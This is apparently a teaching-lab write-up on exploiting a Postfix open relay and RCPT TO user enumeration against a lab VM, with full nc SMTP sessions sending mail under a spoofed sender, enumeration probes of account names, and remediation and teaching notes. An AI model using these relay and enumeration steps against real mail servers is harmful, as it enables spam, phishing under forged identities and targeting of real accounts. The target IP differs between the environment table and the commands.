# Activity: SMTP Open Relay and User Enumeration

## Summary

Exploitation of the two SMTP misconfigurations confirmed in `r-18- smtp-enumeration.md`: demonstrating the open relay by successfully queuing mail to a completely unrelated external domain, and using reliable `RCPT TO`-based user enumeration to confirm valid local accounts. A locally-delivered internal email, discovered afterward by an attacker who has gained any access to the `analyst` account, is also documented as a further breadcrumb.

## Environment

| Item | Value |
|---|---|
| Target | 192.168.144.100 |
| Service | Postfix (Debian/GNU), port 25/tcp |
| Attacker | Kali VM on the same host-only lab network |
| Tooling | nc (manual SMTP interaction) |

## Vulnerability

Two independent misconfigurations:

1. **Open relay**: `mynetworks` was widened from the safe default (`127.0.0.0/8`, localhost only) to include the entire lab subnet (`192.168.144.0/24`), meaning Postfix trusts any host on that subnet as an authorised relay client, rather than restricting relaying to genuinely trusted sources. This is CWE-284 (Improper Access Control).
2. **User enumeration**: since `mydestination` includes `uow-csf.internal`, Postfix performs genuine local-recipient lookups for that domain during the `RCPT TO` stage of a mail transaction, and returns a clearly distinguishable rejection for unknown users. This is CWE-203 (Observable Discrepancy) applied to SMTP; it is enabled by normal, correct mail-delivery logic rather than a deliberate security bypass, which is exactly why it's such a common real-world finding, the behaviour that makes enumeration possible is also the behaviour required for mail to work correctly at all.

## Exploitation

**Open relay demonstration, on Kali:**

```bash
nc -nv 192.168.144.200 25
```
```
HELO test.local
MAIL FROM: attacker@evil.com
RCPT TO: victim@totallyunrelateddomain.com
DATA
Subject: Open relay test

This is a test message sent through an open relay.
.
QUIT
```
```
250 2.1.0 Ok
250 2.1.5 Ok
354 End data with <CR><LF>.<CR><LF>
250 2.0.0 Ok: queued as 4B93D104572
```

The server accepted a spoofed sender (`attacker@evil.com`, never verified), an entirely unrelated external recipient domain, and queued the message for delivery, confirmed on the target via `postqueue -p`:

```
4B93D104572     288 ...  attacker@evil.com
                                         victim@totallyunrelateddomain.com
```

**What this is worth:** an attacker (or spammer) can use this server to send mail that appears to originate from `uow-csf.internal`'s mail infrastructure to any external recipient, with any forged sender address. In a real environment this enables spam campaigns, phishing sent under the organisation's apparent authority, and can result in the organisation's mail server being blacklisted by external mail providers, a real, damaging operational consequence beyond the immediate technical finding.

**User enumeration, on Kali:**

```
RCPT TO: analyst@uow-csf.internal      → 250 2.1.5 Ok
RCPT TO: webops@uow-csf.internal       → 250 2.1.5 Ok
RCPT TO: backupsvc@uow-csf.internal    → 250 2.1.5 Ok
RCPT TO: nosuchuser@uow-csf.internal   → 550 5.1.1 ... User unknown in local recipient table
```

**What this is worth:** this confirms, from an entirely unauthenticated position, exactly which local accounts genuinely exist on the target, `analyst`, `webops`, and `backupsvc` are all confirmed real, corroborating and cross-referencing the same accounts already central to the credential-based exploitation chain elsewhere on this VM (`e-02`, `e-07`, `e-08`, `e-10`). A student without any prior knowledge of these accounts could discover exactly which usernames are worth targeting for password-guessing or phishing, purely from SMTP responses.

## Scenario Content: Internal Mailbox

Separate from the exploit demonstration above, a legitimate internal email was delivered locally to the `analyst` mailbox (not via the open relay, using local mail delivery), giving the mail service genuine organisational content.

```
From: it-support@uow-csf.internal
To: analyst@uow-csf.internal
Subject: Reminder: rotate shared backup credentials

Just a reminder that the shared backup service credentials are due for
rotation this quarter. Please coordinate with IT before the 1st.

In the meantime, the current backup share remains at its usual location.
```

**Important dependency: this content is not retrievable via SMTP itself, and requires prior compromise of the `analyst` account.** Nothing demonstrated in this activity (the open relay test, the `RCPT TO` enumeration) gives an unauthenticated attacker any way to read this mailbox; SMTP is a mail *submission/transport* protocol, not a mailbox-retrieval protocol, and no POP3/IMAP service exists on this VM. The mail was delivered locally via `sendmail` directly into `/var/mail/analyst`, a standard Unix mbox file that only a local process running as `analyst` (or root) can read.

Retrieval genuinely requires a shell as `analyst`, obtained via the separate credential-exposure chain already documented elsewhere on this VM (recover the `backupsvc` credential from the NFS export in `e-02`, use it for an SSH foothold, then escalate or pivot to `analyst` via the shadow-cracking chain in `e-07`). Once that shell exists:

```bash
ssh analyst@192.168.144.200
```
```
You have mail.
```

```bash
cat /var/mail/analyst
```
```
From uow-admin@uow-csf.internal  Tue Aug 25 03:14:49 2026
Return-Path: <uow-admin@uow-csf.internal>
X-Original-To: analyst
Delivered-To: analyst@uow-csf.internal
Received: by mail.uow-csf.internal (Postfix, from userid 1000)
        id BDDE010456E; Tue, 25 Aug 2026 03:14:49 +0100 (BST)
From: it-support@uow-csf.internal
To: analyst@uow-csf.internal
Subject: Reminder: rotate shared backup credentials
Message-Id: <20260825021449.BDDE010456E@mail.uow-csf.internal>
Date: Tue, 25 Aug 2026 03:14:49 +0100 (BST)

Hi,

Just a reminder that the shared backup service credentials are due for
rotation this quarter. Please coordinate with IT before the 1st.

In the meantime, the current backup share remains at its usual location.

Thanks,
IT Support
```

SSH itself even hints at this before the mailbox is manually checked: the login banner shows `You have mail.` whenever a local mailbox has unread content, itself a small but genuine piece of intelligence available immediately on login.

**A further observation worth noting from the real headers:** `Return-Path: <uow-admin@uow-csf.internal>` shows the message was actually submitted locally by the `uow-admin` account (the real sending process), while the `From:` header claims `it-support@uow-csf.internal`. Local mail delivery via `sendmail` does not verify or enforce any correspondence between the `From:` header and the actual submitting identity, exactly the same class of trust weakness demonstrated more directly with the open relay's spoofed `attacker@evil.com` sender earlier in this activity. This is a useful detail for students to notice: header content in an email is data supplied by whoever composed the message, not a cryptographically verified fact, regardless of whether the message arrived via an open relay from the internet or was generated locally on the system itself.

This retrieval step is the actual, demonstrated end-to-end finding; nothing in this activity should be read as suggesting the mailbox content is reachable from an unauthenticated network position. It is recorded here as scenario content requiring a prerequisite this activity does not itself provide, similar in spirit to how the DNS `dc01` record in `e-16` is a forward-looking lead rather than something immediately actionable.

## Outcome

Confirmed a working open relay (spoofed mail successfully queued for an unrelated external domain) and reliable unauthenticated user enumeration confirming three real local accounts (`analyst`, `webops`, `backupsvc`). A legitimate internal email was also seeded in `analyst`'s mailbox as further scenario content; unlike the relay and enumeration findings, this mailbox content is **not** part of the unauthenticated attack surface, it requires a shell as `analyst` (obtained via a separate exploitation chain) to actually read.

## Remediation

- Restore `mynetworks` to `127.0.0.0/8` (or the minimum genuinely required trusted range); never trust an entire subnet for relay purposes without a specific business justification.
- Consider requiring SMTP AUTH for any legitimate relay use case, rather than IP-based trust alone.
- While `RCPT TO`-based enumeration is difficult to eliminate entirely without breaking normal mail delivery semantics, rate-limiting and monitoring for high-volume `RCPT TO` probing from a single source can help detect enumeration attempts in progress.
- Ensure `disable_vrfy_command` remains at its safe default (`yes`) even though this activity found it not to reliably leak information in this configuration; leaving legacy commands enabled unnecessarily still increases attack surface.

## Teaching Notes

This activity is a good demonstration that two related-sounding vulnerability classes (open relay, user enumeration) can have very different real-world consequences: the open relay primarily threatens the organisation's own reputation and mail deliverability, while user enumeration directly assists an attacker's next steps against the organisation's other systems. Students should be encouraged to think about impact in these terms, not just "is it exploitable," but "who does this actually harm, and how."

## Lab Dependencies

**Prerequisite exploit(s):** `r-18- smtp-enumeration.md` (for the relay/enumeration findings); reading the mailbox content additionally requires the credential-exposure chain in `e-02- nfs-anonymous-credential-exposure.md` and `e-07- readable-shadow-credential-cracking.md` to obtain a shell as `analyst`
**Required starting access:** Network access to the target from Kali (relay/enumeration); a shell as `analyst` (mailbox content only)
**Starting account:** None (relay/enumeration); `analyst` (mailbox content only)
**Resulting access:** Confirmed valid local account names (`analyst`, `webops`, `backupsvc`); open relay capability; the mailbox content itself is not reachable from this activity alone
**Provides access for:** Corroborates the account set already used in `e-02`, `e-07`, `e-08`, `e-10`; the internal mailbox becomes readable only once `analyst` is compromised via those activities, at which point it adds a fourth independent confirmation of the `/srv/backups` lead already established via `r-04` (FTP) and `r-15` (SNMP)
**Suggested teaching level:** Level 5-6 (enumeration and relay mechanics); the mailbox content is Level 7 material specifically because it only pays off once chained with the separate credential-exposure activities
